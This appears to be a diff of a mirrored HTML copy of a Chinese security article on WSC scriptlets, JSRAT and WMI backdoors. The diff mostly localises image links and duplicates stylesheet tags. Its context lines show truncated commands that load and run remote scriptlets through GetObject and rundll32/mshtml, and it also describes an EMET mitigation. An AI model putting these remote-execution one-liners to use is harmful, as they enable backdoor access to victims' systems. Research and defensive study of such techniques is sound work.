@@ -3,7 +3,7 @@
 			<head>
 			     <title>WSC、JSRAT and WMI Backdoor - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/15575">http://drops.wooyun.org/tips/15575</a></h1>
 				
@@ -18,7 +18,7 @@
 
 <!--more-->
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016050414161939546.jpeg" alt="Alt text"></p>
+<p><img src="../images_result/images/2016050414161939546.jpeg" alt="Alt text"></p>
 
 <p>相关资料：</p>
 
@@ -78,7 +78,7 @@ WScript.Echo(x);
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160504/20160504061644446242-1.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160504061644446242-1.png" alt="Alt text"></p>
 
 <p><strong>注：</strong><br>
 wsc文件的后缀名可以任意</p>
@@ -113,7 +113,7 @@ GetObject("script:C:\\testwsc\\test.wsc");
 
 <p>执行后如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160504/20160504061646765942-2.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160504061646765942-2.png" alt="Alt text"></p>
 
 <h2>3、远程启动计算器</h2>
 
@@ -129,7 +129,7 @@ GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoo
 
 <p>执行如图：</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016050414173388406.gif" alt="Alt text"></p>
+<p><img src="../images_result/images/2016050414173388406.gif" alt="Alt text"></p>
 
 <h1>0x02 JSRAT</h1>
 
@@ -147,7 +147,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016050414175095923.gif" alt="Alt text"></p>
+<p><img src="../images_result/images/2016050414175095923.gif" alt="Alt text"></p>
 
 <h2>2、jsrat</h2>
 
@@ -319,7 +319,7 @@ EMET.adml</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160504/20160504061648307652-5.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160504061648307652-5.png" alt="Alt text"></p>
 
 <p><strong>(b)</strong>将EMET.admx复制到<code>%SystemRoot%\PolicyDefinitions\</code>下</p>
 
@@ -339,7 +339,7 @@ EMET.adml</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160504/20160504061651696842-6.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160504061651696842-6.png" alt="Alt text"></p>
 
 <p><strong>(c)</strong>设置</p>
 
@@ -348,7 +348,7 @@ EMET.adml</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160504/20160504061653881172-7.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160504061653881172-7.png" alt="Alt text"></p>
 
 <p><strong>(d)</strong>更新组策略模板</p>
 
@@ -360,11 +360,11 @@ gpupdate /force
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160504/20160504061655988952-8.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160504061655988952-8.png" alt="Alt text"></p>
 
 <p><strong>(e)</strong>测试</p>
 
-<p><img src="http://static.wooyun.org//drops/20160504/20160504061657871662-9.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160504061657871662-9.png" alt="Alt text"></p>
 
 <p>通过regsvr32调用scrobj.dll的操作被拦截</p>
 
